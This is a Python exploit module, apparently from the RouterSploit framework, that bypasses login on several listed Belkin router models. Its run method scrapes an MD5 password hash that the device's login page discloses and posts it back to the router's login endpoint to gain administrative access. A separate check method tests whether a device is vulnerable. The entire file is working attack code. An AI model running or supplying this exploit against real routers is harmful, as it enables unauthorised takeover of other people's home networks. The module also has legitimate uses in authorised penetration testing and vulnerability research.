# rsf exploit module
# description: Exploits Belkin authentication using MD5 password disclosure.

import re
import requests

class Exploit:
    __info__ = {
        "name": "Belkin Auth Bypass",
        "description": "Module exploits Belkin authentication using MD5 password disclosure.",
        "authors": (
            "Gregory Smiley <gsx0r.sec[at]gmail.com>",  # vulnerability discovery
            "BigNerd95 (Lorenzo Santina)",  # improved exploit and routersploit module
        ),
        "references": (
            "https://securityevaluators.com/knowledge/case_studies/routers/belkin_n900.php",
            "https://www.exploit-db.com/exploits/40081/",
        ),
        "devices": (
            "Belkin Play Max (F7D4401)",
            "Belkin F5D8633",
            "Belkin N900 (F9K1104)",
            "Belkin N300 (F7D7301)",
            "Belkin AC1200",
        ),
    }

    def __init__(self, target, port=80):
        self.target = target
        self.port = port

    def run(self):
        response = requests.get(f"http://{self.target}:{self.port}/login.stm")
        if response is None:
            return

        val = re.findall(r'password\s?=\s?"(.+?)"', response.text)

        if len(val):
            payload = f"pws={val[0]}&arc_action=login&action=Submit"

            login = requests.post(f"http://{self.target}:{self.port}/login.cgi", data=payload)
            if login is None:
                return

            error = re.search('loginpserr.stm', login.text)

            if not error:
                print("Exploit success, you are now logged in!")
                return

        print("Exploit failed. Device seems to be not vulnerable.")

    def check(self):
        response = requests.get(f"http://{self.target}:{self.port}/login.stm")
        if response is None:
            return False  # target is not vulnerable

        val = re.findall(r'password\s?=\s?"(.+?)"', response.text)

        if len(val):
            return True  # target vulnerable

        return False  # target is not vulnerable

